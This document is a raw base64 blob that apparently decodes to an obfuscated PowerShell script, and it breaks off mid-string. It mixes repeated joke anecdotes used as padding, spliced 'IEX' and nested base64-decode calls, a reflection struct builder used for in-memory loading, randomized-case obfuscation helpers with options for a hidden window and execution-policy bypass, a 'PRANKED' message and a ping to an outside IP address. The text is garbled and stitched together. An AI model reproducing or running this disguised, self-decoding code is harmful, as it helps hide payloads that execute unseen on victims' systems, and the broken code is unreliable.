90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBmKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gNy44LS1PewogICAgW091dHB1dFR5cGUoW1R5cGVdKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5PSRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoeygkXyAtaXMgW1JlZmxlY3Rpb24uRW1pdC5Nb2R1bGVCdWlsZGVyXSkgLW9yICgkXyAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKX0pXQogICAgICAgICRNb2R1bGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVsbE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkU3RydWN0RmllbGRzLAoKICAgICAgICBbUmVmbGVjdGlvbi5FbWl0LlBhY2tpbmdTaXplXQogICAgICAgICRQYWNraW5nU2l6ZSA9IFtSZWZsZWN0aW9uLkVtaXQuUGFja2luZ1NpemVdOjpVbnNwZWNpZmllZCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhwbGljaXRMYXlvdXQKICAgICkKCiAgICBpZiAoJE1vZHVsZSAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKQogICAgewogICAgICAgIHJldHVybiAoJE1vZHVsZS5HZXRUeXBlKCRGdWxsTmFtZSkpCiAgICB9CgogICAgW1JlZmxlY3Rpb24uVHlwZUF0dHJpYnV0ZXNdICRTdHJ1Y3RBdHRyaWJ1dGVzID0gJ0Fuc2lDbGFzcywKICAgICAgICBDbGFzcywKICAgICAgICBQdWJsaWMsCiAgICAgICAgU2VhbGVkLAogICAgICAgIElFWEZpZWxkSW5pdCcKCiAgICBpZiAoJEV4cGxpY2l0TGF5b3V0KQogICAgewogICAgICAgICRTdHJ1Y3RBdHRyaWJ1dGVzID0gJFN0cnVjdEF0dHJpYnV0ZXMgLWJvciBbUmVmbGVjdGlvbi5UeXBlQXR0cmlidXRlc106OkV4cGxpY2l0TGF5b3V0CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJFN0cnVjdEF0dHJpYnV0ZXMgPSAkU3RydWN0QXR0cmlidXRlcyAtYm9yIFtSZWZsZWN0aW9uLlR5cGVBdHRyaWJ1dGVzXTo6U2VxdWVudGlhbExheW91dAogICAgfQoKICAgICRTdHJ1Y3RCdWlsZGVyID0gJE1vZHVsZS5EZWZpbmVUeXBlKCRGdWxsTmFtZSwgJFN0cnVjdEF0dHJpYnV0ZXMsIFtWYWx1ZVR5cGVdLCAkUGFja2luZ1NpemUpCiAgICAkQ29uc3RydWN0b3JJbmZvID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3JzKClbMF0KICAgICRTaXplQ29uc3QgPSBAKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsQXNBdHRyaWJ1dGVdLkdldEZpZWxkKCdTaXplQ29uc3QnKSkKCiAgICAkRmllbGRzID0gTmV3LU9iamVjdCBIYXNodGFibGVbXSgkU3RydWN0RmllbGRzLkNvdW50KQoKICAgICMgU29ydCBlYWNoIGZpZWxkIGFjY29yZGluZyB0byB0aGUgb3JkZXJzIHNwZWNpZmllZAogICAgIyBVbmZvcnR1bmF0ZWx5LCBQU3YyIGRvZXNuJ3QgaGF2ZSB0aGUgbHV4dXJ5IG9mIHRoZQogICAgIyBoYXNodGFibGUgW09yZGVyZWRdIGFjY2VsZXJhdG9yLgogICAgZm9yZWFjaCAoJEZpZWxkIGluICRTdHJ1Y3RGaWVsZHMuS2V5cykKICAgIHsKICAgICAgICAkSW5kZXggPSAkU3RydWN0RmllbGRzWyRGaWVsZF1bJ1Bvc2l0aW9uJ10KICAgICAgICAkRmllbGRzWyRJbmRleF0gPSBAe0ZpZWxkTmFtZSA9ICRGaWVsZDsgUHJvcGVydGllcyA9ICRTdHJ1Y3RGaWVsZHNbJEZpZWxkXX0KICAgIH0KCiAgICBmb3JlYWNoICgkRmllbGQgaW4gJEZpZWxkcykKICAgIHsKICAgICAgICAkRmllbGROYW1lID0gJEZpZWxkWydGaWVsZE5hbWUnXQogICAgICAgICRGaWVsZFByb3AgPSAkRmllbGRbJ1Byb3BlcnRpZXMnXQoKICAgICAgICAkT2Zmc2V0ID0gJEZpZWxkUHJvcFsnT2Zmc2V0J10KICAgICAgICAkVHlwZSA9ICRGaWVsZFByb3BbJ1R5cGUnXQogICAgICAgICRNYXJzaGFsQXMgPSAkRmllbGRQcm9wWydNYXJzaGFsQXMnXQoKICAgICAgICAkTmV3RmllbGQgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVGaWVsZCgkRmllbGROYW1lLCAkVHlwZSwgJ1B1YmxpYycpCgogICAgICAgIGlmICgkTWFyc2hhbEFzKQogICAgICAgIHsKICAgICAgICAgICAgJFVubWFuYWdlZFR5cGUgPSAkTWFyc2hhbEFzWzBdIC1hcyAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdKQogICAgICAgICAgICBpZiAoJE1hcnNoYWxBc1sxXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNpemUgPSAkTWFyc2hhbEFzWzFdCiAgICAgICAgICAgICAgICAkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywKICAgICAgICAgICAgICAgICAgICAkVW5tYW5hZ2VkVHlwZSwgJFNpemVDb25zdCwgQCgkU2l6ZSkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgW09iamVjdFtdXSBAKCRVbm1hbmFnZWRUeXBlKSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE5ld0ZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKICAgICAgICB9CgogICAgICAgIGlmICgkRXhwbGljaXRMYXlvdXQpIHsgJE5ld0ZpZWxkLlNldE9mZnNldCgkT2Zmc2V0KSB9CiAgICB9CgogICAgIyBNYWtlIHRoZSBzdHJ1Y3QgYXdhcmUgb2YgaXRzIG93biBzaXplLgogICAgIyBObyBtb3JlIGhhdmluZyB0byBjYWxsIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mIQogICAgJFNpemVNZXRob2QgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVNZXRob2QoJ0dldFNpemUnLAogICAgICAgICdQdWJsaWMsIFN0YXRpYycsCiAgICAgICAgW0ludF0sCiAgICAgICAgW1R5cGVbXV0gQCgpKQogICAgJElMR2VuZXJhdG9yID0gJFNpemVNZXRob2QuR2V0SUxHZW5lcmF0b3IoKQogICAgIyBUaGFua3MgZm9yIHRoZSBoZWxwLCBKYXNvbiBTaGlyayEKICAgICRJTEdlbmVyYXRvci5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkxkdG9rZW4sICRTdHJ1Y3RCdWlsZGVyKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbVHlwZV0uR2V0TWV0aG9kKCdHZXRUeXBlRnJvbUhhbmRsZScpKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF0uR2V0TWV0aG9kKCdTaXplT2YnLCBbVHlwZVtdXSBAKFtUeXBlXSkpKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6UmV0KQoKICAgICMgQWxsb3cgZm9yIGV4cGxpY2l0IGNhc3RpbmcgZnJvbSBhbiBJbnRQdHIKICAgICMgTm8gbW9yZSBoYXZpbmcgdG8gY2FsbCBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlIQogICAgJEltcGxpY2l0Q29udmVydGVyID0gJFN0cnVjdEJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdvcF9JbXBsaWNpdCcsCiAgICAgICAgJ1ByaXZhdGVTY29wZSwgUHVibGljLCBTdGF0aWMsIEhpZGVCeVNpZywgU3BlY2lhbE5hbWUnLAogICAgICAgICRTdHJ1Y3RCdWlsZGVyLAogICAgICAgIFtUeXBlW11dIEAoW0ludFB0cl0pKQogICAgJElMR2VuZXJhdG9yMiA9ICRJbXBsaWNpdENvbnZlcnRlci5HZXRJTEdlbmVyYXRvcigpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Tm9wKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkxkYXJnXzApCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGR0b2tlbiwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbVHlwZV0uR2V0TWV0aG9kKCdHZXRUeXBlRnJvbUhhbmRsZScpKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkNhbGwsCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdLkdldE1ldGhvZCgnUHRyVG9TdHJ1Y3R1cmUnLCBbVHlwZVtdXSBAKFtJbnRQdHJdLCBbVHlwZV0pKSkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpVbmJveF9BbnksICRTdHJ1Y3RCdWlsZGVyKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OlJldCkKCiAgICAkU3RydWN0QnVpbGRlci5DcmVhdGVUeXBlKCkKfQokRjJhUU1RakdVU2VWZXpSV2ZDSGtSMnU0MkFMRWtyTnNVSkdQNUNCVTZIVVI2cmh4OXhjYzJHID0gQCIKICAgICAgICBbVmFsaWRhdGVTZXQoKFdVSkpFeUNpZ0NJS1dyZ2woJ05vcm1hbCcpKSwgKHdVSkplWUNJR0NpS1dyZ0woJ01pbmltaXplZCcpKSwgKHd1SmpFeUNJR0NpS3dyZ2woJ01heGltaXplZCcpKSwgKFd1akpFWUNJR2NJS1dyZ2woJ0hpZGRlbicpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdHh5N3d4NzNTLAogICAgIkBAIgogICAgICAgIFtWYWxpZGF0ZVNldCgod1VqSkVZQ2lHQ0lLd1JHTCgnQnlwYXNzJykpLCAod3VqSkVZY0lHQ0lLd3JHbCgnVW5yZXN0cmljdGVkJykpLCAod1VKakVZY0lHQ0lrV1JnbCgnUmVtb3RlU2lnbmVkJykpLCAod1VKSkVZQ2lHY2lLV3JnbCgnQWxsU2lnbmVkJykpLCAoV3VqakVZQ0lHQ0lrd1JnbCgnUmVzdHJpY3RlZCcpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb2l3VWFJYnh1TGNzaFksCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkeXN0a0VIOU1SMWV1STdPZDMKICAgICkKCiAgICAjIEVuY29kaW5nIGJhc2UgdmFsdWVzOiAxNj1IZXgsIDg9T2N0YWwsIDI9QmluYXJ5CiAgICAkR01kX0pPOElDSXAgPSAyCiAgICAiQEAiCiAgICAjIEVpdGhlciBjb252ZXJ0IFNjcmlwdEJsb2NrIHRvIGEgU3RyaW5nIG9yIGNvbnZlcnQgc2NyaXB0IGF0ICRQYXRoIHRvIGEgU3RyaW5nLgogICAgSWYoJFRiU3RDcEJQVlsoJ3swfXsxfSctZidQYXQnLCdoJyldKQogICAgewogICAgICAgIEdldC1DaGlsZEl0ZW0gJEh3bDRCVUNLWTkgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgICRRN3hBUU5xMVk4OGUgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggJGh3bDRidWNLWTkpKQogICAgfQogICAgRWxzZQogICAgewogICAgICAgICRxN3hhUU5xMVk4OGUgPSBbU3RyaW5nXSRvOURmMFNScHQ4M0Y2QmhvNWkKICAgIH0KCiAgICAjIENyZWF0ZSBsaXN0IG9mIHJhbmRvbSBkZWxpbWl0ZXJzICRSYW5kb21EZWxpbWl0ZXJzLgogICAgIyBBdm9pZCB1c2luZyAuICogJyAiIFsgXSAoICkgZXRjLiBhcyBkZWxpbWl0ZXJzIGFzIHRoZXNlIHdpbGwgY2F1c2UgcHJvYmxlbXMgaW4gdGhlIC1TcGxpdCBjb21tYW5kIHN5bnRheC4KICAgICRhVlZTOFkxMmt0bVdfZDUgID0gQCgoV3VqSkV5Q0lHQ0lLd3JHTCgnXycpKSwod1VKSkVZY0lHQ0lrV1JHbCgnLScpKSwod3VqSmV5Y0lHQ0lLV3JnTCgnLCcpKSwoV3VqSkVZQ0lHQ0lLd1JnTCgneycpKSwod1VqSmV5Q0lnY0lrV1JnTCgnfScpKSwod1VKSmV5Q0lHQ0lLV1JnTCgnficpKSwoV1VqSkVZY0lHY2lLV3JHTCgnIScpKSwoV1VKSkVZQ2lnQ0lrd3JHTCgnQCcpKSwod1VqSmVZQ0lnQ0lrd3JnTCgnJScpKSwoV1VqamV5Q0lnY2lrV3JHbCgnJicpKSwod3VKSkVZQ0lHQ0lLd3JnTCgnPCcpKSwod1VqSkVZY0lHQ0lrV3JnTCgnPicpKSwod3VKakVZQ0lHQ0lLV1JnbCgnOycpKSwod3VKSkVZY0lHY2lLV3JnbCgnOicpKSkKICAgICJAQCIKICAgICMgQWRkIGxldHRlcnMgYS16IHdpdGggcmFuZG9tIGNhc2UgdG8gJFJhbmRvbURlbGltaXRlcnMuCiAgICBAKChXVUpKRVlDSWdDaUtXcmdsKCdhJykpLCh3dUpKRVljSUdDSWtXckdsKCdiJykpLChXdWpqRXljSWdDaUtXckdMKCdjJykpLCh3dWpKRVlDSWdjaWt3cmdMKCdkJykpLChXdUpqRXlDSUdDSUt3cmdsKCdlJykpLCh3VUpKZVljaWdDSWtXcmdsKCdmJykpLChXdUpKRXljSUdDSUtXUmdMKCdnJykpLCh3dWpqZXljaUdjaWtXcmdMKCdoJykpLCh3dUpKZVlDaUdDSUtXcmdsKCdpJykpLCh3VWpKRVlDaWdjSUt3UmdsKCdqJykpLCh3VWpqRVlDSWdDSUtXUkdMKCdrJykpLCh3VUpKRVlDaUdDSWtXckdMKCdsJykpLChXdUpqZVljSUdjSUtXcmdsKCdtJykpLCh3VWpqZVlDaUdDaUtXUkdMKCduJykpLChXdUpqRVljSWdDSWt3ckdsKCdvJykpLCh3dUpKRXljSUdDaUt3cmdsKCdwJykpLChXdWpKZVlDSUdjSWt3ckdMKCdxJykpLCh3VUpKRXlDSWdDSWtXUkdsKCdyJykpLCh3dUpKZVljSUdDSUtXcmdMKCdzJykpLCh3dWpqRVlDSUdjaWtXUmdMKCd0JykpLChXVWpqRXlDaWdDSWtXckdMKCd1JykpLCh3dWpKZXljSUdjSUtXckdsKCd2JykpLCh3dWpKZVlDSUdDSUt3cmdMKCd3JykpLChXdUpKZVljSWdDSWtXcmdMKCd4JykpLCh3VWpKZXlDaWdDaUtXcmdsKCd5JykpLChXVUpKRVljaUdjaWtXcmdsKCd6JykpKSB8IEZvckVhY2gtT2JqZWN0IHskUU9oN2tWMTFGUmVTNl8ybmkgPSAkXzsgSWYoKChHZXQtUmFuZG9tIC1JbnB1dCBAKCgyIC0gMSkuLigyICsgKDEgLSAxKSkpKS0oMyAtIDIpIC1lcSAwKSkgeyRRT0g3S1YxMUZSZVM2XzJuSSA9ICRxT2g3a1YxMUZyZVM2XzJOaS5Ub1VwcGVyKCl9ICRBVnZTOHkxMkt0TXdfZDUgKz0gJFFPSDdLdjExZlJlUzZfMk5JfQogICAgCiAgICAjIE9ubHkgdXNlIGEgc3Vic2V0IG9mIGN1cnJlbnQgZGVsaW1pdGVycyB0byByYW5kb21pemUgd2hhdCB5b3Ugc2VlIGluIGV2ZXJ5IGl0ZXJhdGlvbiBvZiB0aGlzIHNjcmlwdCdzIG91dHB1dC4KICAgICRBVlZzOHkxMktUbXdfZDUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2dlM4eTEya1RNV19kNSAtQ291bnQgKCRBdnZTOFkxMmt0bVdfZDUuQ291bnQvKDIgKyAyKSkpCgogICAgIyBDb252ZXJ0ICRTY3JpcHRTdHJpbmcgdG8gZGVsaW1pdGVkIEJpbmFyeSB2YWx1ZXMgaW4gW0NoYXJdIGFycmF5IHNlcGFyYXRlZCBieSByYW5kb20gZGVsaW1pdGVyIGZyb20gZGVmaW5lZCBsaXN0ICRSYW5kb21EZWxpbWl0ZXJzLgogICAgJHhOVEoydzgxVkogPSAod3VqSkVZQ0lHQ2lrV3JnbCgnJykpCiAgICAoW0NoYXJbXV0kUTdYQVFucTFZODhlKSB8IEZvckVhY2gtT2JqZWN0IHskWG50ajJ3ODFWaiArPSAoW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJGdtRF9KTzhJQ2lwKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2czh5MTJrdG1XX2Q1KSl9CgoiQAokRTFPWVA2dTlxaDRlbjkwID0gQCIKICAgIFBSQU5LRUQgSEVIRUhFIEhBVyBIRUhFSEUgSEFXIEhFSEhIRSBIQVcgSEhFRUVFIEhBVwoiQAogICAgUGluZyAyMC4xMjMuMjQ1LjEyIC1uIDEKJERFTE10Uzh4WGNUN3QzdXpSMjYgPSBAIgogIyBSZW1vdmUgdHJhaWxpbmcgZGVsaW1pdGVyIGZyb20gJERlbGltaXRlZEVuY29kZWRBcnJheS4KICAgICR4TlRqMnc4MXZKID0gJFhOVGoydzgxdmouU3ViU3RyaW5nKCgwICsgKDEgLSAxKSksJHhOVGoydzgxdkouTGVuZ3RoLTEpCgogICAgIyBDcmVhdGUgcHJpbnRhYmxlIHZlcnNpb24gb2YgJFJhbmRvbURlbGltaXRlcnMgaW4gcmFuZG9tIG9yZGVyIHRvIGJlIHVzZWQgYnkgZmluYWwgY29tbWFuZC4KICAgICRwT3Nnalp0ID0gKEdldC1SYW5kb20gLUlucHV0ICRBdlZTOFkxMktUbXdfRDUgLUNvdW50ICRBdnZTOFkxMmt0TXdfZDUuTGVuZ3RoKSAtSm9pbiAnJwogICAgIkBAIgogICAgIyBtKCkgcmFuZG9tIGNhc2UgdmVyc2lvbnMgZm9yIG5lY2Vzc2FyeSBvcGVyYXRpb25zLgogICAgJEFyS3NadVJNOUR5MTcgPSBHZXQtUmFuZG9tIC1JbnB1dCBAKCh3VUpKZVlDSWdDSUt3UmdMKCdGb3JFYWNoJykpLCh3dWpqZVlDaUdDaWtXckdMKCdGb3JFYWNoLU9iamVjdCcpKSwod3VKSkVZY0lHQ0lLV1JHbCgnJScpKSkKICAgICRockx5cU1WcklWeE5NeVkgICAgICAgPSAoW0NoYXJbXV0od3VKakV5Y0lHQ0lrV3JHbCgnW1N0cmluZ106OkpvaW4nKSkgICAgICB8IEZvckVhY2gtT2JqZWN0IHskR19Vb3RRNlhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uKDEgKyAwKSkpIHskR19VT3RRNlhHID0gJEdfdW9UUTZYRy5Ub1VwcGVyKCl9ICRHX1VvdHE2WGd9KSAtSm9pbiAnJwogICAgJFkwb0Z4YmNNTyAgICAgICAgPSAoW0NoYXJbXV0oV1VqSkV5Q0lHQ2